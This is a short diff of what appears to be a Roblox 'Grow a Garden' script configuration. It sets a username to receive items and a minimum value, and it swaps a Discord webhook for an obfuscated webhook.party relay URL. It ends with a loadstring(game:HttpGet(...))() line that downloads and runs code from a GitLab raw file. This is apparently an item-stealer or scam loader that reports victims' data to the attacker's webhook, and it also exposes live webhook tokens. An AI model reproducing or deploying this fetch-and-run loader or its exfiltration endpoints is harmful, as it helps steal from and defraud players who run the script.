@@ -1,6 +1,6 @@
 Username = "k0sowa"
 Webhook =
-"https://discord.com/api/webhooks/1386884346689884170/YSheRoAPcfv63GEauY220ryJTh__YcwkaxhQPuNsVM-anCLHly7Zun-Se2MDNT5cY1iu"
+"https://l.webhook.party/hook/iKebLsnaA3RZ3DnSz3KBggxP6poQOFXeWScgA44fuTGji5e0iXpMeUHY%2FpJ9g%2Be2YdoA33FzMqjCXtFKP6%2FcoguFyjV1hJ7r%2FIFbTvyZAbZo8xhONx8enqni%2BxzoIpZWV1tmXjvbQhl0IWgL94TfxzGy58n%2BRX8KyE6N6UK03FygTErwfI9I0PIBeUkQR434Ol8Ll2eDIPKxa2DNCmHCrREhutj5XWJrgExMjmzJNyKArSQ%2Fp%2FVN3WFMS8pvO6m68yXGCwX7EagRrFnZiaMT70KmpdPvhfSbUmF%2FNCkG%2Fts7jPHVaGW1N9UI3yJ6hZOX0EVxAjMUQ5pZHW4yaQ3mz3IWG8KrJnwUa5BRaiMfSKIIztU7v0P1wwaUnjM1VKU1GKfcFmeFIpI%3D/agXMSJijLtnUqJtM"
 MinimumValue = 1
 
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
